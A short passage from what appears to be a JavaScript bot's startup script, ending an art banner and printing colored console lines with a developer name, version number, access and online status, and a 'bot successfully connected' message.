⣿⣿⣿⣾⣿⠏⣤⡁⣷⣽⣿⣿⣿⣿⣷⣶⣿⣿⣿⣿⣿⣱⠸⣱⣦⠙⣿⣿⣿⣾⣿`));
    console.log(chalk.bold.white("DEVELOPER: RLOO11"));
    console.log(chalk.bold.white("VERSION: 3.0.1"));
    console.log(chalk.bold.white("ACCESS: ") + chalk.bold.green("YES"));
    console.log(chalk.bold.white("STATUS: ") + chalk.bold.green("ONLINE\n\n"));
    console.log(chalk.bold.yellow("[+] Bot successfully connected"));
})();